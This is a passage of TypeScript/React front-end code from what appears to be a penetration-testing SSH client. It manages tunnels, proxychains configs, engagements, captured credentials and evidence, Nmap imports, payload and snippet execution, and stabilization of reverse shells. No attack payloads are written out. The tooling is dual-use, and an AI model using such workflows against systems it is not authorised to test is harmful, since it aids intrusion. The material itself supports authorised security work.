    const host = vaultSummary.hosts.find((h) => h.id === hostId);
    const api = getWailsBindings();
    if (!api?.StartForwardTunnel || !api?.ConnectSavedHost) {
      setStatusMessage('Wails backend not available to start tunnel.');
      return;
    }

    setStatusMessage(`Connecting dedicated background session to ${host ? host.label : hostId} for tunnel...`);
    try {
      // ALWAYS dial a fresh dedicated background session specifically for this tunnel
      const bgSessionId = await api.ConnectSavedHost(hostId, { cols: 80, rows: 24 });
      await api.StartForwardTunnel(bgSessionId, ruleId);
      await refreshForwardState();
      setStatusMessage(`Started tunnel on ${host ? host.label : hostId} (dedicated background session).`);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setStatusMessage(`Failed to start tunnel: ${msg}`);
      throw err;
    }
  };

  const handleStopForwardTunnel = async (tunnelIdOrRuleId: string): Promise<void> => {
    const api = getWailsBindings();
    const targetTunnel = activeTunnels.find(
      (t) => t.id === tunnelIdOrRuleId || t.ruleId === tunnelIdOrRuleId
    );
    const tunnelSessionId = targetTunnel?.sessionId;

    if (api?.StopForwardTunnel) {
      try {
        await api.StopForwardTunnel(tunnelIdOrRuleId);
        await refreshForwardState();

        // If the session was a dedicated background session (not attached to any open tab/pane),
        // cleanly close it so no background connection leaks.
        if (tunnelSessionId && api.DisconnectSession) {
          const isSessionInUseByTabs = tabs.some((t) => {
            const panes = collectPanes(t.rootNode);
            return panes.some((p) => p.sessionId === tunnelSessionId);
          });
          if (!isSessionInUseByTabs) {
            try {
              await api.DisconnectSession(tunnelSessionId);
            } catch {
              // Ignore cleanup error if already closed
            }
          }
        }
        setStatusMessage('Stopped tunnel and closed background session.');
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Stop tunnel failed: ${msg}`);
      }
    } else {
      setActiveTunnels((prev) => prev.filter((t) => t.id !== tunnelIdOrRuleId && t.ruleId !== tunnelIdOrRuleId));
    }
  };

  const handleSaveProxyProfile = async (profile: ProxyProfile): Promise<void> => {
    const api = getWailsBindings();
    if (api?.SaveProxyProfile) {
      try {
        await api.SaveProxyProfile(profile);
        await refreshVaultState();
        setStatusMessage(`Saved proxy profile "${profile.name}".`);
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Save proxy profile failed: ${msg}`);
      }
    } else {
      setVaultSummary((prev) => {
        const existing = prev.proxyProfiles || [];
        const idx = existing.findIndex((p) => p.id === profile.id);
        const summary: ProxyProfileSummary = {
          id: profile.id,
          name: profile.name,
          type: profile.type,
          jumpHostIds: profile.jumpHostIds,
          command: profile.command,
          socksAddress: profile.socksAddress,
          socksUsername: profile.socksUsername,
          hasPassword: !!profile.socksPassword,
          engagementId: profile.engagementId,
        };
        let next: ProxyProfileSummary[];
        if (idx >= 0) {
          next = [...existing];
          next[idx] = summary;
        } else {
          next = [...existing, summary];
        }
        return { ...prev, proxyProfiles: next };
      });
      setStatusMessage(`Saved proxy profile "${profile.name}" (local).`);
    }
  };

  const handleDeleteProxyProfile = async (profileId: string): Promise<void> => {
    const api = getWailsBindings();
    if (api?.DeleteProxyProfile) {
      try {
        await api.DeleteProxyProfile(profileId);
        await refreshVaultState();
        setStatusMessage('Deleted proxy profile.');
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Delete proxy profile failed: ${msg}`);
      }
    } else {
      setVaultSummary((prev) => ({
        ...prev,
        proxyProfiles: (prev.proxyProfiles || []).filter((p) => p.id !== profileId),
      }));
      setStatusMessage('Deleted proxy profile (local).');
    }
  };

  const handleOpenProxychainsExport = async (): Promise<void> => {
    const api = getWailsBindings();
    if (api?.GetDefaultProxychainsOptions) {
      try {
        const opts = await api.GetDefaultProxychainsOptions();
        setProxychainsOptions(opts);
      } catch {
        setProxychainsOptions(undefined);
      }
    }
    setShowProxychainsExportModal(true);
  };

  const handleSelectEngagement = async (engagementId: string) => {
    const api = getWailsBindings();
    if (!api?.SetActiveEngagement) return;
    try {
      await api.SetActiveEngagement(engagementId || 'none');
      if (api.GetActiveEngagement) {
        const act = await api.GetActiveEngagement();
        setActiveEngagement(act || null);
      }
      if (api.ListEngagements) {
        const list = await api.ListEngagements();
        setEngagementsList(list || []);
      }
      await refreshVaultState();
    } catch (err) {
      console.error('Failed to switch engagement:', err);
    }
  };

  const handleSaveEngagement = async (eng: Engagement) => {
    const api = getWailsBindings();
    if (!api?.SaveEngagement) return;
    try {
      await api.SaveEngagement(eng);
      if (api.SetActiveEngagement) {
        await api.SetActiveEngagement(eng.id);
      }
      if (api.GetActiveEngagement) {
        const act = await api.GetActiveEngagement();
        setActiveEngagement(act || null);
      }
      if (api.ListEngagements) {
        const list = await api.ListEngagements();
        setEngagementsList(list || []);
      }
      await refreshVaultState();
      setStatusMessage(`Saved engagement "${eng.name}".`);
    } catch (err: unknown) {
      console.error('Failed to save engagement:', err);
    }
  };

  const handleTerminalSelectionContextMenu = (
    e: MouseEvent,
    sessionId: string,
    selectedText: string
  ) => {
    const targetHostId = findHostForSessionId(sessionId, tabs);
    setTerminalContextMenu({
      x: e.clientX,
      y: e.clientY,
      sessionId,
      selectedText,
      hostId: targetHostId,
    });
  };

  const handleSaveSelectionCredential = async (cred: CredentialEntry) => {
    const api = getWailsBindings();
    if (api?.SaveCredential) {
      await api.SaveCredential(cred);
    }
    const matchedHost = vaultSummary.hosts.find((h) => h.id === cred.hostId);
    const hostNote = matchedHost ? ` for ${matchedHost.label || matchedHost.address}` : '';
    setStatusMessage(`Saved credential "${cred.label}"${hostNote} to vault.`);
  };

  const handleSaveSelectionEvidence = async (ev: EvidenceItem) => {
    const api = getWailsBindings();
    if (api?.SaveEvidence) {
      await api.SaveEvidence(ev);
    }
    const matchedHost = vaultSummary.hosts.find((h) => h.id === ev.hostId);
    const hostNote = matchedHost ? ` for ${matchedHost.label || matchedHost.address}` : '';
    const reportNote = ev.inReport ? ' [Reportable]' : ' [Internal Only]';
    setStatusMessage(`Saved evidence artifact "${ev.title}"${hostNote}${reportNote} to vault.`);
  };

  const handleSaveSelectionNote = async (note: NotePage) => {
    const api = getWailsBindings();
    if (api?.SaveNote) {
      await api.SaveNote(note);
      if (api.ListNotes) {
        const allNotes = await api.ListNotes('all');
        setNotes(allNotes || []);
      }
    }
    const matchedHost = vaultSummary.hosts.find((h) => h.id === note.hostId);
    const hostNote = matchedHost ? ` for ${matchedHost.label || matchedHost.address}` : '';
    setStatusMessage(`Saved recon note "${note.title}"${hostNote} to vault.`);
  };

  const handleSaveSelectionFinding = async (finding: FindingItem, evidence: EvidenceItem) => {
    const api = getWailsBindings();
    if (api?.SaveEvidence) {
      await api.SaveEvidence(evidence);
    }
    if (api?.SaveFinding) {
      await api.SaveFinding(finding);
    }
    const matchedHost = vaultSummary.hosts.find((h) => h.id === finding.hostId);
    const hostNote = matchedHost ? ` for ${matchedHost.label || matchedHost.address}` : '';
    setStatusMessage(`Created security finding "${finding.title}"${hostNote} with attached evidence.`);
  };

  const handleOpenShellStabilize = () => {
    if (!activePane?.sessionId) {
      setStatusMessage('No active terminal session to stabilize.');
      return;
    }
    const dims = getTerminalDimensions(activePane.sessionId);
    const isRawTcp =
      activePane.sessionId.startsWith('rawtcp-') ||
      activePane.sessionId.startsWith('tcp-') ||
      (activePane.title || '').includes('Raw TCP') ||
      (activePane.title || '').includes('RevShell');
    setShellStabilizeModal({
      isOpen: true,
      sessionId: activePane.sessionId,
      sessionTitle: activePane.title || activePane.sessionId,
      isRawTcp: Boolean(isRawTcp),
      cols: dims.cols,
      rows: dims.rows,
    });
  };

  const handleRunShellStabilize = async (req: ShellStabilizeRequest) => {
    const api = getWailsBindings();
    if (api?.StabilizeShell) {
      await api.StabilizeShell(req);
    }
    setStatusMessage(`Injected PTY stabilization (${req.method} / ${req.mode}) into ${req.sessionId}.`);
  };

  const handleScanNmapXML = async (xmlContent: string): Promise<NmapScanResult> => {
    const api = getWailsBindings();
    if (api?.ScanNmapXML) {
      return await api.ScanNmapXML(xmlContent);
    }
    throw new Error('ScanNmapXML API is unavailable');
  };

  const handleImportNmapXML = async (req: NmapImportRequest): Promise<NmapImportSummary> => {
    const api = getWailsBindings();
    if (api?.ImportNmapXML) {
      const summary = await api.ImportNmapXML(req);
      await refreshVaultState();
      setStatusMessage(summary.message);
      return summary;
    }
    throw new Error('ImportNmapXML API is unavailable');
  };

  const handleGenerateProxychainsConfig = async (opts: ProxychainsExportOptions): Promise<string> => {
    const api = getWailsBindings();
    if (api?.GenerateProxychainsConfig) {
      return await api.GenerateProxychainsConfig(opts);
    }
    const proto = opts.proxies[0]?.type || 'socks5';
    const host = opts.proxies[0]?.host || '127.0.0.1';
    const port = opts.proxies[0]?.port || 1080;
    return `# proxychains.conf - generated by DoubleAgent SSH Client\n${opts.chainType}\n${opts.proxyDNS ? 'proxy_dns\n' : ''}tcp_read_time_out ${opts.tcpReadTimeout}\ntcp_connect_time_out ${opts.tcpConnectTimeout}\n\n[ProxyList]\n${proto}    ${host}    ${port}\n`;
  };

  const handleSaveProxychainsFile = async (content: string, targetPath: string): Promise<void> => {
    const api = getWailsBindings();
    if (api?.SaveProxychainsFile) {
      await api.SaveProxychainsFile(content, targetPath);
    }
  };

  const handleSaveSnippet = async (snippet: Snippet): Promise<void> => {
    const api = getWailsBindings();
    const toSave: Snippet = {
      ...snippet,
      id: snippet.id || `snippet-${Date.now()}`,
    };
    let savedAny = false;
    if (api?.SaveSnippetToFile) {
      try {
        await api.SaveSnippetToFile(toSave);
        if (api.ListSnippetsFromFile) {
          const reloaded = await api.ListSnippetsFromFile();
          setExternalSnippets(reloaded || []);
        }
        savedAny = true;
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Save external snippet failed: ${msg}`);
      }
    }
    if (api?.SaveSnippet) {
      try {
        await api.SaveSnippet(toSave);
        await refreshVaultState();
        savedAny = true;
      } catch (err: unknown) {
        if (!savedAny) {
          const msg = err instanceof Error ? err.message : String(err);
          setStatusMessage(`Save snippet failed: ${msg}`);
          return;
        }
      }
    } else if (!savedAny) {
      setVaultSummary((prev) => {
        const exists = (prev.snippets || []).some((s) => s.id === toSave.id);
        const list = exists
          ? (prev.snippets || []).map((s) => (s.id === toSave.id ? toSave : s))
          : [...(prev.snippets || []), toSave];
        return { ...prev, snippets: list };
      });
    }
    setStatusMessage(`Saved snippet "${toSave.name}".`);
  };

  const handleDeleteSnippet = async (snippetId: string): Promise<void> => {
    const api = getWailsBindings();
    let deletedAny = false;
    if (api?.DeleteSnippetFromFile) {
      try {
        await api.DeleteSnippetFromFile(snippetId);
        if (api.ListSnippetsFromFile) {
          const reloaded = await api.ListSnippetsFromFile();
          setExternalSnippets(reloaded || []);
        }
        deletedAny = true;
      } catch {
        // continue to vault delete
      }
    }
    if (api?.DeleteSnippet) {
      try {
        await api.DeleteSnippet(snippetId);
        await refreshVaultState();
        deletedAny = true;
      } catch (err: unknown) {
        if (!deletedAny) {
          const msg = err instanceof Error ? err.message : String(err);
          setStatusMessage(`Delete snippet failed: ${msg}`);
          return;
        }
      }
    } else if (!deletedAny) {
      setVaultSummary((prev) => ({
        ...prev,
        snippets: (prev.snippets || []).filter((s) => s.id !== snippetId),
      }));
    }
    setStatusMessage('Snippet deleted.');
  };

  const handleSaveNote = async (note: NotePage): Promise<void> => {
    const api = getWailsBindings();
    const now = new Date().toISOString();
    const optimisticId = note.id || `note-${Date.now()}`;
    const optimisticNote: NotePage = {
      ...note,
      id: optimisticId,
      createdAt: note.createdAt || now,
      updatedAt: now,
    };
    setNotes((prev) => {
      const exists = prev.some((n) => n.id === optimisticId);
      return exists ? prev.map((n) => (n.id === optimisticId ? optimisticNote : n)) : [...prev, optimisticNote];
    });
    if (
      optimisticId.startsWith('note-scratchpad-') ||
      optimisticId.startsWith('note-sp-') ||
      (note.title || '').toLowerCase().startsWith('scratchpad')
    ) {
      setScratchpadContent(note.body || '');
    }
    if (api?.SaveNote) {
      try {
        await api.SaveNote(optimisticNote);
        await refreshVaultState();
        setStatusMessage(`Saved ${note.isFolder ? 'folder' : 'note'} "${note.title}".`);
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Save note failed: ${msg}`);
      }
    } else {
      setStatusMessage(`Saved ${note.isFolder ? 'folder' : 'note'} "${note.title}".`);
    }
  };

  const handleDeleteNote = async (noteId: string): Promise<void> => {
    const api = getWailsBindings();
    if (api?.DeleteNote) {
      try {
        await api.DeleteNote(noteId);
        await refreshVaultState();
        setStatusMessage('Note deleted.');
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Delete note failed: ${msg}`);
      }
    } else {
      setNotes((prev) => {
        const toDelete = new Set<string>([noteId]);
        let changed = true;
        while (changed) {
          changed = false;
          for (const n of prev) {
            if (n.parentId && toDelete.has(n.parentId) && !toDelete.has(n.id)) {
              toDelete.add(n.id);
              changed = true;
            }
          }
        }
        return prev.filter((n) => !toDelete.has(n.id));
      });
      setStatusMessage('Note deleted.');
    }
  };

  const handleTriggerSnippet = useCallback(
    async (snippet: Snippet, targetSessionId?: string, mode: 'run' | 'insert' = 'run'): Promise<void> => {
      const sessId = targetSessionId || sessionId;

      if (!sessId) {
        setStatusMessage(
          mode === 'insert'
            ? 'No active terminal session to insert snippet into.'
            : 'No active terminal session to run snippet in.'
        );
        return;
      }

      setSnippetActiveSessionId(sessId);

      let ctx: SnippetContext = {
        timestamp: new Date().toISOString().replace('T', ' ').slice(0, 19),
        date: new Date().toISOString().slice(0, 10),
        time: new Date().toTimeString().slice(0, 8),
        workingDir: getSessionCwd(sessId) || '~',
      };

      const api = getWailsBindings();
      if (api?.GetSnippetContext) {
        try {
          const backendCtx = await api.GetSnippetContext(sessId);
          ctx = { ...ctx, ...backendCtx };
          if (!ctx.workingDir) {
            ctx.workingDir = getSessionCwd(sessId) || '~';
          }
        } catch {
          // fallback
        }
      }

      const hasVars = (snippet.variables && snippet.variables.length > 0) || /\{\{([^{}]+)\}\}/.test(snippet.body);

      if (mode === 'insert') {
        if (hasVars || snippet.confirmBeforeRun) {
          setRunModalMode('insert');
          setRunModalSnippet(snippet);
          setRunModalContext(ctx);
        } else {
          await api?.WriteTerminal?.(sessId, snippet.body);
          setStatusMessage(`Inserted snippet "${snippet.name}" into terminal.`);
        }
        return;
      }

      if (snippet.confirmBeforeRun || hasVars) {
        setRunModalMode('run');
        setRunModalSnippet(snippet);
        setRunModalContext(ctx);
      } else {
        try {
          if (api?.ExecuteSnippet) {
            await api.ExecuteSnippet(sessId, snippet.id, {});
          } else {
            await api?.WriteTerminal?.(sessId, snippet.body + '\n');
          }
          setStatusMessage(`Sent snippet "${snippet.name}" to terminal.`);
        } catch (err: unknown) {
          const msg = err instanceof Error ? err.message : String(err);
          setStatusMessage(`Execute snippet failed: ${msg}`);
        }
      }
    },
    [sessionId]
  );

  const mergedSnippets = useMemo(() => {
    const byId = new Map<string, Snippet>();
    for (const s of externalSnippets) {
      byId.set(s.id, s);
    }
    for (const s of vaultSummary.snippets || []) {
      if (!byId.has(s.id)) {
        byId.set(s.id, s);
      }
    }
    return Array.from(byId.values());
  }, [externalSnippets, vaultSummary.snippets]);

  const collectUniqueTags = useCallback((items: Array<{ tags?: string[] }>): string[] => {
    const tagMap = new Map<string, string>();
    for (const item of items) {
      for (const rawTag of item.tags || []) {
        const trimmed = rawTag.trim();
        if (!trimmed) continue;
        const lower = trimmed.toLowerCase();
        if (!tagMap.has(lower)) {
          tagMap.set(lower, trimmed);
        }
      }
    }
    return Array.from(tagMap.values()).sort((a, b) => a.localeCompare(b));
  }, []);

  const snippetDrawerTags = useMemo(
    () => collectUniqueTags(mergedSnippets),
    [collectUniqueTags, mergedSnippets]
  );

  const matchesTagFilter = (tags: string[] | undefined, selectedTag: string): boolean => {
    if (selectedTag === 'all') return true;
    const needle = selectedTag.toLowerCase();
    return (tags || []).some((t) => t.trim().toLowerCase() === needle);
  };

  const renderSidebarTagBar = (
    tags: string[],
    selectedTag: string,
    onSelect: (nextTag: string) => void,
    ariaLabel: string
  ) =>
    tags.length > 0 ? (
      <div className="drawer-filter-bar">
        <select
          className="sidebar-search"
          aria-label={ariaLabel}
          value={selectedTag}
          onChange={(e) => onSelect(e.target.value)}
          style={{ width: '100%', padding: '0.28rem 0.45rem', fontSize: '0.73rem' }}
        >
          <option value="all">All Tags ({tags.length})</option>
          {tags.map((tag) => (
            <option key={tag} value={tag}>
              #{tag}
            </option>
          ))}
        </select>
      </div>
    ) : null;

  const renderSidebarCardTags = (
    tags: string[] | undefined,
    selectedTag: string,
    onSelect: (nextTag: string) => void,
    kindLabel: string
  ) =>
    tags && tags.length > 0 ? (
      <div style={{ display: 'flex', flexWrap: 'wrap', gap: '0.25rem', marginBottom: '0.25rem' }}>
        {tags.map((tag) => {
          const isActive = selectedTag.toLowerCase() === tag.toLowerCase();
          return (
            <button
              key={tag}
              type="button"
              className="drawer-badge"
              style={{ cursor: 'pointer' }}
              title={`Filter ${kindLabel} by tag #${tag}`}
              onClick={() => onSelect(isActive ? 'all' : tag)}
            >
              #{tag}
            </button>
          );
        })}
      </div>
    ) : null;

  const filteredDrawerSnippets = useMemo(() => {
    return mergedSnippets.filter((s) => {
      if (snippetDrawerOs !== 'all') {
        const hasOsTag = (s.tags || []).some((t) => t.toLowerCase() === snippetDrawerOs);
        if (!hasOsTag) return false;
      }
      if (!matchesTagFilter(s.tags, snippetDrawerTag)) return false;
      if (snippetDrawerQuery) {
        const q = snippetDrawerQuery.toLowerCase();
        const matchesName = (s.name || '').toLowerCase().includes(q);
        const matchesDesc = (s.description || '').toLowerCase().includes(q);
        const matchesCmd = (s.body || '').toLowerCase().includes(q);
        const matchesTag = (s.tags || []).some((t) => t.toLowerCase().includes(q));
        if (!matchesName && !matchesDesc && !matchesCmd && !matchesTag) return false;
      }
      return true;
    });
  }, [mergedSnippets, snippetDrawerOs, snippetDrawerTag, snippetDrawerQuery]);

  const filteredSidebarPayloads = useMemo(() => {
    const q = sidebarPayloadQuery.toLowerCase().trim();
    return sidebarPayloads.filter((t) => {
      if (sidebarPayloadOs !== 'all' && t.os !== 'any' && t.os !== sidebarPayloadOs) {
        return false;
      }
      if (q) {
        return (
          t.name.toLowerCase().includes(q) ||
          (t.shell || '').toLowerCase().includes(q) ||
          (t.kind || '').toLowerCase().includes(q) ||
          (t.command || '').toLowerCase().includes(q)
        );
      }
      return true;
    });
  }, [sidebarPayloads, sidebarPayloadQuery, sidebarPayloadOs]);

  const activeHostId = activePane?.hostId || activeTab?.hostId;

  // Sync Scratchpad buffer when switching host or when the host's single scratchpad note updates in vault
  const lastSyncedScratchpadKeyRef = useRef<string>('');
  useEffect(() => {
    const hostId = activeHostId || '';
    const canonicalId = hostId ? `note-scratchpad-${hostId}` : 'note-scratchpad-global';
    const existingNote = notes.find(
      (n) =>
        !n.isFolder &&
        (n.id === canonicalId ||
          ((n.hostId || '') === hostId &&
            (n.id.startsWith('note-sp-') || n.title.toLowerCase().startsWith('scratchpad'))))
    );
    const syncKey = `${hostId}::${existingNote?.id || ''}::${existingNote?.updatedAt || ''}`;
    if (existingNote && lastSyncedScratchpadKeyRef.current !== syncKey) {
      lastSyncedScratchpadKeyRef.current = syncKey;
      setScratchpadContent(existingNote.body || '');
    }
  }, [activeHostId, notes]);

  const filteredDrawerCreds = useMemo(() => {
    const list = drawerCreds || [];
    const filtered = list.filter((c: CredentialEntry) => {
      if (credDrawerScope === 'host_and_engagement' && activeHostId) {
        if (c.hostId && c.hostId !== activeHostId) return false;
      }
      if (credDrawerQuery) {
        const q = credDrawerQuery.toLowerCase();
        const matchesLabel = (c.label || '').toLowerCase().includes(q);
        const matchesUser = (c.username || '').toLowerCase().includes(q);
        const matchesHost = (c.hostId || '').toLowerCase().includes(q);
        if (!matchesLabel && !matchesUser && !matchesHost) return false;
      }
      return true;
    });
    return filtered.sort((a, b) => {
      const aMatch = activeHostId && a.hostId === activeHostId ? 1 : 0;
      const bMatch = activeHostId && b.hostId === activeHostId ? 1 : 0;
      return bMatch - aMatch;
    });
  }, [drawerCreds, credDrawerScope, activeHostId, credDrawerQuery]);

  const drawerChains = useMemo(() => {
    return chains.length > 0 ? chains : (vaultSummary.snippetChains || []);
  }, [chains, vaultSummary.snippetChains]);

  const chainDrawerTags = useMemo(
    () => collectUniqueTags(drawerChains),
    [collectUniqueTags, drawerChains]
  );

  const filteredDrawerChains = useMemo(() => {
    return drawerChains.filter((c) => {
      if (!matchesTagFilter(c.tags, chainDrawerTag)) return false;
      if (chainDrawerQuery) {
        const q = chainDrawerQuery.toLowerCase();
        const matchesName = (c.name || '').toLowerCase().includes(q);
        const matchesDesc = (c.description || '').toLowerCase().includes(q);
        const matchesCat = (c.category || '').toLowerCase().includes(q);
        const matchesOs = (c.targetOs || '').toLowerCase().includes(q);
        const matchesTag = (c.tags || []).some((t) => t.toLowerCase().includes(q));
        const matchesStep = (c.steps || []).some(
          (st) => (st.title || '').toLowerCase().includes(q) || (st.command || '').toLowerCase().includes(q)
        );
        if (!matchesName && !matchesDesc && !matchesCat && !matchesOs && !matchesTag && !matchesStep) {
          return false;
        }
      }
      return true;
    });
  }, [drawerChains, chainDrawerTag, chainDrawerQuery]);

  const handleSaveScratchpadToHostNotes = async () => {
    if (!scratchpadContent.trim()) {
      setStatusMessage('Scratchpad buffer is empty.');
      return;
    }
    const hostId = activeHostId || '';
    const canonicalId = hostId ? `note-scratchpad-${hostId}` : 'note-scratchpad-global';
    const existingNote = notes.find(
      (n) =>
        !n.isFolder &&
        (n.id === canonicalId ||
          ((n.hostId || '') === hostId &&
            (n.id.startsWith('note-sp-') || n.title.toLowerCase().startsWith('scratchpad'))))
    );
    const noteId = existingNote?.id || canonicalId;
    const hostObj = vaultSummary.hosts.find((h) => h.id === hostId);
    const hostLabel = hostObj?.label || hostObj?.address || activeTab?.title || '';
    const now = new Date().toISOString();
    const title =
      existingNote && !existingNote.title.startsWith('Scratchpad Loot (')
        ? existingNote.title
        : hostId && hostLabel
          ? `Scratchpad (${hostLabel})`
          : 'Scratchpad';
    const note: NotePage = {
      id: noteId,
      hostId,
      engagementId: existingNote?.engagementId ?? (activeEngagement?.id || ''),
      parentId: existingNote?.parentId || '',
      isFolder: false,
      title,
      type: 'markdown',
      body: scratchpadContent,
      order: existingNote?.order || 0,
      createdAt: existingNote?.createdAt || now,
      updatedAt: now,
    };
    await handleSaveNote(note);
    setNotesModalInitialNoteId(noteId);
    setTabs((prev) =>
      prev.map((t) =>
        t.tabType === 'notes' ? { ...t, notesInitialNoteId: noteId } : t
      )
    );
    setStatusMessage(`Saved scratchpad to Host Notes: "${title}".`);
  };

  const handleExecuteSnippetFromModal = async (userValues: Record<string, string>): Promise<void> => {
    if (!runModalSnippet || !snippetActiveSessionId) return;
    const api = getWailsBindings();
    if (api?.ExecuteSnippet) {
      await api.ExecuteSnippet(snippetActiveSessionId, runModalSnippet.id, userValues);
    } else {
      let previewCmd = runModalSnippet.body;
      for (const [k, v] of Object.entries(userValues)) {
        previewCmd = previewCmd.replace(new RegExp(`\\{\\{${k}[^}]*\\}\\}`, 'g'), v);
      }
      await api?.WriteTerminal?.(snippetActiveSessionId, previewCmd + '\n');
    }
    setStatusMessage(`Executed snippet "${runModalSnippet.name}".`);
  };

  const handleSaveSnippetChain = async (chain: SnippetChain) => {
    const api = getWailsBindings();
    if (api?.SaveSnippetChainToFile) {
      try {
        await api.SaveSnippetChainToFile(chain);
      } catch {
        // Continue to vault save
      }
    }
    if (api?.SaveSnippetChain) {
      await api.SaveSnippetChain(chain);
      await refreshVaultState();
      setStatusMessage(`Saved snippet chain "${chain.name}".`);
    }
  };

  const handleDeleteSnippetChain = async (chainId: string) => {
    const api = getWailsBindings();
    if (api?.DeleteSnippetChainFromFile) {
      try {
        await api.DeleteSnippetChainFromFile(chainId);
      } catch {
        // Continue to vault delete
      }
    }
    if (api?.DeleteSnippetChain) {
      await api.DeleteSnippetChain(chainId);
      await refreshVaultState();
      setStatusMessage(`Deleted snippet chain.`);
    }
  };

  const handleTriggerChain = async (chain: SnippetChain, targetSessionId?: string) => {
    const sessId = targetSessionId || sessionId;
    if (!sessId) {
      setStatusMessage('Please select an active terminal session to run the snippet chain.');
      return;
    }

    const currentHost = activeTab?.hostId ? vaultSummary.hosts.find((h) => h.id === activeTab.hostId) : undefined;
    const api = getWailsBindings();
    let ctx: SnippetContext = {
      hostId: activeTab?.hostId || undefined,
      hostLabel: currentHost?.label || undefined,
      address: currentHost?.address || undefined,
      hostname: currentHost?.label || currentHost?.address || undefined,
      port: currentHost?.effectivePort || 22,
      username: currentHost?.effectiveUser || undefined,
      workingDir: getSessionCwd(sessId) || '~',
      timestamp: new Date().toISOString().replace('T', ' ').slice(0, 19),
      date: new Date().toISOString().slice(0, 10),
      time: new Date().toTimeString().slice(0, 8),
    };

    if (api?.GetSnippetContext) {
      try {
        const backendCtx = await api.GetSnippetContext(sessId);
        ctx = { ...ctx, ...backendCtx };
        if (!ctx.workingDir) {
          ctx.workingDir = getSessionCwd(sessId) || '~';
        }
      } catch {
        // fallback
      }
    }

    setRunnerActiveSessionId(sessId);
    setRunnerModalContext(ctx);
    setRunnerModalChain(chain);
  };

  const handleExecuteChainStepFromRunner = async (stepIndex: number, userValues: Record<string, string>): Promise<void> => {
    if (!runnerModalChain || !runnerActiveSessionId) {
      throw new Error('No active terminal session for chain execution');
    }
    const api = getWailsBindings();
    if (api?.ExecuteSnippetChainStep) {
      await api.ExecuteSnippetChainStep(runnerActiveSessionId, runnerModalChain.id, stepIndex, userValues);
    } else {
      const step = runnerModalChain.steps[stepIndex];
      let cmd = step.command;
      for (const [k, v] of Object.entries(userValues)) {
        cmd = cmd.replace(new RegExp(`\\{\\{${k}[^}]*\\}\\}`, 'g'), v);
      }
      await api?.WriteTerminal?.(runnerActiveSessionId, cmd + '\n');
    }
    setStatusMessage(`Executed step ${stepIndex + 1} of chain "${runnerModalChain.name}".`);
  };

  const handleConnect = async (e: React.FormEvent): Promise<void> => {
    e.preventDefault();
    if (directAuthMethod === 'key' && !directKeyId && (vaultSummary.keys || []).length > 0) {
      setStatusMessage('Please select an SSH key from the Keychain dropdown.');
      return;
    }
    const api = getWailsBindings();
    if (!api) {
      const mockSessionId = `sess-direct-${Date.now()}`;
      const matchedHost = vaultSummary.hosts.find(
        (h) => h.address.toLowerCase() === address.trim().toLowerCase()
      );
      openSessionTab(mockSessionId, `${username}@${address}:${port}`, matchedHost?.id, matchedHost?.color);
      setPassword('');
      setDirectKeyPassphrase('');
      setStatusMessage(`Connected (${username}@${address}:${port})`);
      return;
    }
    setStatusMessage(`Connecting to ${username}@${address}:${port}...`);
    try {
      const id = await api.ConnectSSH({
        address: address.trim(),
        port: Number(port) || 22,
        username: username.trim(),
        password: directAuthMethod === 'password' ? password : '',
        keyId: directAuthMethod === 'key' ? directKeyId : '',
        privateKey: '',
        passphrase: directAuthMethod === 'key' ? directKeyPassphrase : '',
        useAgent: directAuthMethod === 'agent',
        size: { cols: 120, rows: 34 },
      });
      const matchedHost = vaultSummary.hosts.find(
        (h) => h.address.toLowerCase() === address.trim().toLowerCase()
      );
      openSessionTab(id, `${username}@${address}:${port}`, matchedHost?.id, matchedHost?.color);
      setPassword('');
      setDirectKeyPassphrase('');
      setStatusMessage(`Connected (${username}@${address}:${port})`);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setStatusMessage(`Connection failed: ${msg}`);
    }
  };

  const handleHostKeyDecision = async (trust: boolean): Promise<void> => {
    if (!hostKeyPrompt) {
      return;
    }
    const api = getWailsBindings();
    const current = hostKeyPrompt;
    setHostKeyPrompt(null);
    if (api) {
      await api.ResolveHostKeyPrompt(current.hostPattern, current.port, trust);
    }
  };

  const getBroadcastTargetSessionIds = useCallback((): string[] => {
    if (!broadcastState.enabled) return [];
    if (broadcastState.scope === 'tab') {
      if (!activeTab) return [];
      const panes = collectPanes(activeTab.rootNode);
      return panes
        .filter((p) => !p.paneType || p.paneType === 'terminal')
        .map((p) => p.sessionId);
    }
    if (broadcastState.scope === 'all') {
      const allPanes: string[] = [];
      tabs.forEach((t) => {
        if (t.tabType === 'terminal' || !t.tabType) {
          const panes = collectPanes(t.rootNode);
          panes.forEach((p) => {
            if (!p.paneType || p.paneType === 'terminal') {
              allPanes.push(p.sessionId);
            }
          });
        }
      });
      return allPanes;
    }
    if (broadcastState.scope === 'custom') {
      return broadcastState.customSessionIds;
    }
    return [];
  }, [broadcastState, activeTab, tabs]);

  const handleToggleBroadcast = useCallback((scope?: BroadcastScope): void => {
    setBroadcastState((prev) => {
      const newEnabled = !prev.enabled || (scope !== undefined && scope !== prev.scope);
      const newScope = scope || prev.scope;
      setStatusMessage(
        newEnabled
          ? `Broadcast Input ACTIVE (${newScope === 'tab' ? 'Current Tab' : newScope === 'all' ? 'All Terminals' : 'Custom Selection'}). Keystrokes are sent to all participating sessions.`
          : 'Broadcast Input disarmed.'
      );
      let custom = prev.customSessionIds;
      if (newEnabled && newScope === 'custom' && custom.length === 0 && activePane) {
        custom = [activePane.sessionId];
      }
      return {
        enabled: newEnabled,
        scope: newScope,
        customSessionIds: custom,
      };
    });
  }, [activePane]);

  const handleToggleSessionBroadcast = useCallback((sid: string): void => {
    setBroadcastState((prev) => {
      let currentSelection: string[] = [];
      if (prev.scope === 'custom') {
        currentSelection = prev.customSessionIds;
      } else if (prev.enabled) {
        currentSelection = getBroadcastTargetSessionIds();
      }

      const isSelected = currentSelection.includes(sid);
      const updated = isSelected
        ? currentSelection.filter((id) => id !== sid)
        : [...currentSelection, sid];

      const newEnabled = updated.length > 0;
      setStatusMessage(
        newEnabled
